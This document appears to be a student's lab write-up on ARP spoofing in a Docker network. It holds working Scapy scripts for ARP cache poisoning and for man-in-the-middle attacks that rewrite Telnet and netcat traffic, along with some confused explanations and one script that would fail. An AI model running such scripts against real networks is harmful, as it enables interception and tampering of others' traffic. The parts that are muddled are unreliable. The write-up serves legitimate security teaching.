# ARP Spoofing Attack
The Address Resolution Protocol (ARP) is a communication protocol used for discovering the link layer address, such as the MAC address, given an IP address. The ARP protocol is a very simple protocol, and it does not implement any security measure.

![diagram](https://user-images.githubusercontent.com/126002808/220416965-09b077df-d999-478f-bdf3-78c42b4dcb50.png)

## ARP Request
```
#!/usr/bin/env python3
from scapy.all import *

# Create Ethernet and ARP objects
ethernet = Ether(dst='02:42:0a:09:00:05', src='02:42:0a:09:00:69')
arp = ARP(op=1, pdst='10.9.0.5', hwsrc='02:42:0a:09:00:69', hwdst='02:42:0a:09:00:05', psrc='10.9.0.6')

# Echo message before sending packet
print("Nigel is sending an ARP request")

# Send the packet
sendp(ethernet/arp) 
```

This script is using Scapy, a Python-based packet manipulation tool, to send an ARP reply packet. <br/>
This script is using the Scapy library to create and send an Address Resolution Protocol (ARP) request packet.<br/> 

An ARP request packet is used to discover the hardware address (MAC address) of a device on the same network by broadcasting a request to all devices on the network. The script creates two objects: <br/>

1) an Ethernet object
2) ARP object

The Ethernet object is used to define the source and destination MAC addresses of the packet. <br/>
The ARP object is used to define the operation code, source and destination IP addresses, and source and destination MAC addresses of the packet. <br/>
<br/>
The script then uses the print statement to display a message to the console indicating that Nigel is sending an ARP request. Finally, the script sends the packet using the sendp() function from the Scapy library.
<br/>
The first line ```#!/usr/bin/env python3``` is known as the shebang line.<br/>
It tells the operating system to use the Python 3 interpreter to execute the script. <br/>
<br/>
The second line from ```scapy.all import *``` imports all of the classes and functions in the Scapy library. <br/>
This allows the script to use Scapy to create, manipulate and send network packets. <br/>
<br/>
It first creates Ethernet and ARP objects to define the packet's source and destination addresses, as well as the IP addresses involved. <br/>
It then prints the message ```"Nigel is sending an ARP request"``` before sending the packet using the ```sendp``` function.


![arp-req](https://user-images.githubusercontent.com/126002808/220420309-b15b1cf7-e7ce-4ac4-a7c1-ccddfae3b901.png)

## ARP Reply
```
#!/usr/bin/env python3  
from scapy.all import *  
# Create Ethernet and ARP objects  
ethernet = Ether(dst='02:42:0a:09:00:05', src='02:42:0a:09:00:69') 
# ARP reply uses op-2. Previously, ARP request used op=1 
arp = ARP(op=2, pdst='10.9.0.5', hwsrc='02:42:0a:09:00:69', hwdst='02:42:0a:09:00:05', psrc='10.9.0.6')  
# Print the message that Nigel is sending an ARP reply
print("Nigel is sending an ARP reply")
# Send the packet 
sendp(ethernet/arp)  
```

Similar to the first script, we create an Ethernet frame with a specified source and destination MAC address. <br/>
The next line creates an ARP packet, with a specified source and destination MAC and IP addresses <br/>
This specifies that it is an ARP reply packet by setting the ```'op'``` field to ```2.``` <br/>
<br/>
The line ```print("Nigel is sending an ARP reply")``` prints a message to the console stating that Nigel is sending an ARP reply packet. <br/>
<br/>
Finally, the ```sendp(ethernet/arp)``` function sends the Ethernet frame and ARP packet as a single packet over the network using Scapy's ```sendp()``` function.

![arp-rep](https://user-images.githubusercontent.com/126002808/220423164-cff058a6-8371-4466-8461-b672a09df364.png)


## Gratuitous ARP
```
#!/usr/bin/env python3
from scapy.all import *

# Create Ethernet and ARP objects
ethernet = Ether(dst='02:42:0a:09:00:05', src='02:42:0a:09:00:69')
arp = ARP(op=2, pdst='10.9.0.5', hwsrc='02:42:0a:09:00:69', hwdst='ff:ff:ff:ff:ff:ff', psrc='10.9.0.5')

# Print the message that Nigel is sending a Gratuitous ARP message
print("Nigel is sending a Gratuitous ARP message")

# Send the packet
sendp(ethernet/arp)
```

![grat-arp](https://user-images.githubusercontent.com/126002808/220428701-fd8a00ac-fefd-46bf-a947-6e7438630782.png)


# MITM Attack on Telnet using ARP Cache Poisoning

This code uses the Scapy library to send Address Resolution Protocol (ARP) reply packets to spoof the MAC addresses of two hosts on a network. I set the IP addresses and MAC addresses for three hosts on the network. The code creates two ARP reply packets using the ARP class from Scapy. Each packet is set up with the appropriate source and destination MAC and IP addresses. The code enters a loop that sends the two ARP packets continuously every 5 seconds using the send() function from Scapy.
The effect of sending these packets is to cause the two target hosts to update their ARP tables with the incorrect MAC addresses for each other, effectively redirecting their traffic through the host with the spoofed MAC address. This can be used for malicious purposes such as intercepting or modifying network traffic.

```
#!/usr/bin/env python3
from scapy.all import *
# Set the target IP addresses
target_a_ip = '10.9.0.5'
target_b_ip = '10.9.0.6'
# Set the MAC addresses for Hosts A, B, and M
host_a_mac = '02:42:0a:09:00:05'
host_b_mac = '02:42:0a:09:00:06'
host_m_mac = '02:42:0a:09:00:69'
# Create the ARP reply packets
arp_a = ARP(op=2, hwsrc=host_m_mac, psrc=target_b_ip, hwdst=host_a_mac, pdst=target_a_ip)
arp_b = ARP(op=2, hwsrc=host_m_mac, psrc=target_a_ip, hwdst=host_b_mac, pdst=target_b_ip)
# Send the packets continuously every 5 seconds
while True:
       send(arp_a)
       send(arp_b)
       time.sleep(5)
```

### With IP Forwarding Disabled

```
sysctl net.ipv4.ip_forward=0
```

![ip-forward-off](https://user-images.githubusercontent.com/126002808/220438539-3e69a4e5-ea23-459f-a3a4-0dd51d6bd9e6.png)

If IP forwarding is enabled on Host M, it will forward the packets between Host A and Host B. Therefore, both Host A and Host B will receive the ARP reply packets sent by Host M. However, if IP forwarding is disabled on Host M, it will not forward the packets, and Host B will not receive the ARP reply packets sent by Host M. As a result, only Host A will receive the ARP reply packets in this case.

### With IP Forwarding Enabled

```
sysctl net.ipv4.ip_forward=1
```

![ip-forward-on](https://user-images.githubusercontent.com/126002808/220438591-160fc830-0bc4-4800-ab72-6b2cd609f1e7.png)

In summary, if IP forwarding is disabled on Host M, only Host A will receive the ARP reply packets, while if IP forwarding is enabled on Host M, both Host A and Host B will receive the ARP reply packets.

## Launching an MitM Attack on Telnet

Here is an example of a sniff-and-spoof program that intercepts TCP packets between Container A and Container B on the same LAN and replaces each typed character with a fixed character (Z):

```
#!/usr/bin/env python3
from scapy.all import *
print ("Nigel is injecting Zs")

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create a new packet based on the captured one.
        # 1) We need to delete the checksum in the IP & TCP headers,
        # because our modification will make them invalid.
        # Scapy will recalculate them if these fields are missing.
        # 2) We also delete the original TCP payload.
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        # Construct the new payload based on the old payload.
        if pkt[TCP].payload:
            newdata = b'Z' * len(pkt[TCP].payload)
            send(newpkt/newdata)
        else:
            send(newpkt)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # Create new packet based on the captured one
        # Do not make any change
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)

f = 'tcp'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```

In this script, I added a newdata variable that contains the payload data consisting of a series of Z's. If the original payload data is not empty, it should use the length of the original payload data to generate a string of Z's with the same length. The script then replaces the original payload data with the new data and send the modified packet.


![7](https://user-images.githubusercontent.com/126002808/221431228-eab37170-8e06-4a4d-aa82-efe635ee8a64.png)

To achieve the above, a series of actions play out: <br/>
<br/>
1. Prepared ```3 windows``` that are shelled into ```container M``` and ```1 container``` shelled into ```container A```.
2. Ran the ```ARP cache poisining``` script on ```container M```
3. Enabled ```IP Forwarding``` on ```container M```
4. Started a ```telnet session```on ```container A``` to connect to ```container B``` - via the command ```telnet 10.9.0.5```
5. Disabled ```IP Forwarding``` on ```container M```
6. Ran the ```MitM spoofing``` script on ```container M```
7. Started typing random characters in the ```telnet session```on ```container A```
8. SUCCESS: All characters started changing to Z.

## Launching an MitM Attack on Netcat

The below code performs a Man-in-the-Middle (MitM) attack on ```Netcat``` traffic between two hosts, Host A and Host B. <br/>
This time we are changing netcat connections instead of ```telnet``` to allow ```Host M``` to intercept the communications between Hosts A and B and modify the data:

```
#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create a new packet based on the captured one.
        # 1) We need to delete the checksum in the IP & TCP headers,
        # because our modification will make them invalid.
        # Scapy will recalculate them if these fields are missing.
        # 2) We also delete the original TCP payload.
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        
        # Construct the new payload based on the old payload.
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load.decode()  # Decode bytes to string
            lines = data.split("\n")  # Split payload into lines
            new_lines = []
            for line in lines:
                words = line.split()
                if words:
                    first_word = words[0]
                    new_word = "A" * len(first_word)  # Replace with A's of same length
                    new_line = line.replace(first_word, new_word, 1)  # Replace only the first occurrence
                    new_lines.append(new_line)
                else:
                    new_lines.append(line)
            newdata = "\n".join(new_lines).encode()  # Re-encode lines to bytes
            send(newpkt/newdata)
        else:
            send(newpkt)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # Create new packet based on the captured one
        # Do not make any change
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)

iface = "eth0"
filter_str = "tcp and src host {} and dst host {}".format(IP_A, IP_B)
pkt = sniff(iface=iface, filter=filter_str, prn=spoof_pkt)
```

Here's what I'm aiming to do with the above modifications for ```netcat```: <br/>
<br/>
1. Decode the TCP payload from bytes to string.
2. Split the payload into lines.
3. Iterate over the lines and for each line:
4. Split the line into words.
5. If there are words, get the first word and replace it with a sequence of A's of the same length.
6. Append the modified line to a new list of lines.
7. Join the new list of lines into a single string with newline characters.
8. Encode the new string back to bytes and use it as the payload of the new packet.

### Second Attempt
```
#!/usr/bin/env python3
from scapy.all import *
print ("Nigel is injecting Z's")

# Define the IP and MAC addresses of the containers
container_a_ip = "10.9.0.5"
container_a_mac = "02:42:0a:09:00:06"
container_b_ip = "10.9.0.6"
container_b_mac = "02:42:0a:09:00:05"
attacker_ip = "10.9.0.105"
attacker_mac = "02:42:0a:09:00:69"

# Define the spoofed packet
def spoof_packet(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet[IP].src == container_a_ip and packet[IP].dst == container_b_ip:
        # Get the raw data from the TCP packet
        raw_data = packet[Raw].load.decode(errors='ignore')
        # Replace each typed character with Z
        modified_data = 'Z' * len(raw_data)
        # Create a new IP header with the source and destination IP addresses
        ip_header = IP(src=container_a_ip, dst=container_b_ip)
        # Create a new TCP header with the source and destination port numbers
        tcp_header = TCP(sport=packet[TCP].sport, dport=packet[TCP].dport, flags=packet[TCP].flags, seq=packet[TCP].seq, ack=packet[TCP].ack)
        # Create a new packet with the spoofed IP and TCP headers and the modified raw data
        spoofed_packet = ip_header/tcp_header/modified_data.encode()
        # Send the spoofed packet to the target container B
        sendp(spoofed_packet, iface='eth0', verbose=False)

# Start sniffing for TCP packets between Container A and Container B
sniff(filter='tcp and host %s and host %s' % (container_a_ip, container_b_ip), prn=spoof_packet)
```

### Third Attempt
This script replaces each typed character in Telnet with the character 'Z', and also allows for redirecting the TCP packets to a spoofed address. Note that I added a new variable ```IP_M``` for the spoofed IP address and ```MAC_M``` for the spoofed MAC address, and modified the ```spoof_pkt()``` function to create and send the spoofed packets. <br/>
<br/>
The script does not necessarily need to start with ```#!/usr/bin/env python3``` as it is not required for the script to run. However, it is a common practice to include this line at the beginning of a Python script so that the operating system can find the Python interpreter and execute the script properly.<br/>
<br/>
Regarding the IP and MAC addresses, these continue to be required for the script to work properly. I could a script where it will assume that Host A and Host B are on the same network segment and that their IP and MAC addresses can be automatically discovered through the ARP cache. (Needs testing!!!). However, it is always a good practice to specify the IP and MAC addresses explicitly to ensure that the packets are sent to the correct destination. <br/>
<br/>
Here is an alternative version of the script that I have been testing:

```
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def telnet_listener(pkt):
    if pkt.haslayer(TCP) and pkt[TCP].dport == 23 and pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode('utf-8', errors='ignore').strip()
        if payload == 'Nigel Douglas':
            response = 'AAAAA Douglas'
            response_pkt = Ether(dst=MAC_A, src=MAC_B) / IP(dst=IP_A, src=IP_B) / TCP(dport=pkt[TCP].sport, sport=pkt[TCP].dport, flags='A') / Raw(load=response)
            sendp(response_pkt, verbose=False)

sniff(filter='tcp', prn=telnet_listener)
```

In this version of the script, the IP and MAC addresses for Host A and Host B are explicitly defined at the beginning of the script. The response_pkt is constructed using the specified IP and MAC addresses instead of relying on automatic ARP resolution. The sendp function is used instead of send to send the packet at the data link layer. <br/>
<br/>
Note that the MAC addresses in this example are using Docker's default networking setup, which is why they start with ```02:42```. Your MAC addresses may be different depending on your network setup. You can find the MAC addresses for Host A and Host B using the ifconfig command on each host.

## Launching an  MitM Attack on Netcat
To modify the previous script to replace every occurrence of a first name in the message with a sequence of A's in the TCP packets exchanged between Host A and Host B communicating via netcat, I added the below code:

```
#!/usr/bin/env python3
from scapy.all import *
import re

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create a new packet based on the captured one.
        # 1) We need to delete the checksum in the IP & TCP headers,
        # because our modification will make them invalid.
        # Scapy will recalculate them if these fields are missing.
        # 2) We also delete the original TCP payload.
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        #################################################################
        # Construct the new payload based on the old payload.
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load  # The original payload data
            # Replace first names with a sequence of A's
            newdata = re.sub(r'\b([A-Za-z]+)\b', lambda match: 'A' * len(match.group(1)), data)
            send(newpkt/newdata)
        else:
            send(newpkt)
        ################################################################
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # Create new packet based on the captured one
        # Do not make any change
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)

f = 'tcp and (host ' + IP_A + ' or host ' + IP_B + ')'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```

![AAAAA](https://user-images.githubusercontent.com/126002808/221714016-18f58539-357d-41af-b5fd-d9a136c583bc.png)





In the modified script, the re module is imported to perform regular expression matching for replacing first names with A's. The ```spoof_pkt()``` function is modified to use a regular expression to find and replace first names with A's of the same length, using the ```re.sub()``` function. The f variable is modified to filter for TCP packets with either Host A or Host B as the source or destination address.<br/>
<br/>
In earlier tests, the ```replace_firstname``` function aimed to take the original data as input and replaces every occurrence of the first name with a sequence of A's of the same length. The ```spoof_pkt``` function would then attempt to intercept those TCP packets exchanged between Host A and Host B communicating via netcat, replacing every occurrence of the first name with a sequence of A's, and forwards the modified packets to the destination. The ```sniff``` function can then be used to start sniffing the network traffic on the interface ```eth0```, and calls the ```spoof_pkt``` function for each intercepted packet that matches the specified filter.

![netcat](https://user-images.githubusercontent.com/126002808/220471819-bedaa5cd-f555-469a-8801-3cb68b9293fe.png)
